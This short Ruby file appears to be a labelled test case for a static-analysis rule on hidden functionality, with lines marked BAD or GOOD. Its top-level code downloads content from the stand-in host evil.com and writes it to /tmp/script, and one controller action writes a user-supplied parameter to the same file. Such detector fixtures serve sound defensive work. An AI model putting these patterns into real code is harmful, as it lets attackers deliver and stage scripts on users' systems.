require "net/http"

resp = Net::HTTP.new("evil.com").get("/script").body
file = File.open("/tmp/script", "w")
# {fact rule=hidden-functionality@v1.0 defects=1}
file.write(resp) # BAD

# {/fact}

class ExampleController < ActionController::Base
  def example
    script = params[:script]
    file = File.open("/tmp/script", "w")
    # {fact rule=hidden-functionality@v1.0 defects=1}
    file.write(script) # BAD

    # {/fact}
  end

  def example2
    a = "a"
    file = File.open("/tmp/script", "w")
    # {fact rule=hidden-functionality@v1.0 defects=1}
    file.write(a) # GOOD

    # {/fact}
  end
end